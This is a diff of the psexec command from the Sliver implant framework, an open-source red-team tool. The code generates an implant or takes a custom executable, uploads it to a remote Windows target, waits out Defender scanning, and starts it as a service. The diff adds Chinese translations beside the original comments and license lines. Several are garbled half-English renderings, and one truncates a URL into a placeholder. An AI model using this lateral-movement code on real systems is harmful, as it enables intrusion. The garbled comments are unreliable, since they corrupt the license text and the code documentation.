@@ -3,19 +3,30 @@ package exec
 /*
 	Sliver Implant Framework
 	Copyright (C) 2021  Bishop Fox
+	Copyright (C) 2021 Bishop Fox
 
 	This program is free software: you can redistribute it and/or modify
+	This 程序是免费软件：您可以重新分发它 and/or 修改
 	it under the terms of the GNU General Public License as published by
+	它根据 GNU General Public License 发布的条款
 	the Free Software Foundation, either version 3 of the License, or
+	Free Software Foundation，License 的版本 3，或
 	(at your option) any later version.
+	（由您选择）稍后 version.
 
 	This program is distributed in the hope that it will be useful,
+	This 程序被分发，希望它有用，
 	but WITHOUT ANY WARRANTY; without even the implied warranty of
+	但是WITHOUT ANY WARRANTY；甚至没有默示保证
 	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+	MERCHANTABILITY 或 FITNESS FOR A PARTICULAR PURPOSE. See
 	GNU General Public License for more details.
+	GNU General Public License 更多 details.
 
 	You should have received a copy of the GNU General Public License
+	You 应已收到 GNU General Public License 的副本
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
+	与此 program. If 不一起，请参见 <__PH0__
 */
 
 import (
@@ -37,6 +48,7 @@ import (
 )
 
 // PsExecCmd - psexec command implementation.
+// PsExecCmd - psexec 命令 implementation.
 func PsExecCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
 	session := con.ActiveTarget.GetSessionInteractive()
 	if session == nil {
@@ -71,6 +83,7 @@ func PsExecCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
 		}
 
 		// generate sliver
+		// 生成 sliver
 		generateCtrl := make(chan bool)
 		con.SpinUntil(fmt.Sprintf("Generating sliver binary for %s\n", profile), generateCtrl)
 		profiles, err := con.Rpc.ImplantProfiles(context.Background(), &commonpb.Empty{})
@@ -93,6 +106,7 @@ func PsExecCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
 		serviceBinary, _ = generate.GetSliverBinary(implantProfile, con)
 	} else {
 		// use a custom exe instead of generating a new Sliver
+		// 使用自定义 exe 而不是生成新的 Sliver
 		fileBytes, err := os.ReadFile(customExe)
 		if err != nil {
 			con.PrintErrorf("Error reading custom executable '%s'\n", customExe)
@@ -105,6 +119,7 @@ func PsExecCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
 	filePath := fmt.Sprintf("%s\\%s.exe", uploadPath, filename)
 	uploadGzip, _ := new(encoders.Gzip).Encode(serviceBinary)
 	// upload to remote target
+	// 上传到远程目标
 	uploadCtrl := make(chan bool)
 	con.SpinUntil("Uploading service binary ...", uploadCtrl)
 	upload, err := con.Rpc.Upload(context.Background(), &sliverpb.UploadReq{
@@ -122,12 +137,18 @@ func PsExecCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
 	con.PrintInfof("Uploaded service binary to %s\n", upload.GetPath())
 	con.PrintInfof("Waiting a bit for the file to be analyzed ...\n")
 	// Looks like starting the service right away often fails
+	// Looks之类的立即启动服务经常会失败
 	// because a process is already using the binary.
+	// 因为进程已经在使用 binary.
 	// I suspect that Defender on my lab is holding access
+	// I 怀疑我实验室的 Defender 持有访问权限
 	// while scanning, which often resulted in an error.
+	// 扫描时，通常会导致 error.
 	// Waiting 5 seconds seem to do the trick here.
+	// Waiting 5 秒似乎可以解决问题 here.
 	time.Sleep(5 * time.Second)
 	// start service
+	// 启动服务
 	binaryPath := fmt.Sprintf(`%s\%s.exe`, binPath, filename)
 	serviceCtrl := make(chan bool)
 	con.SpinUntil("Starting service ...", serviceCtrl)
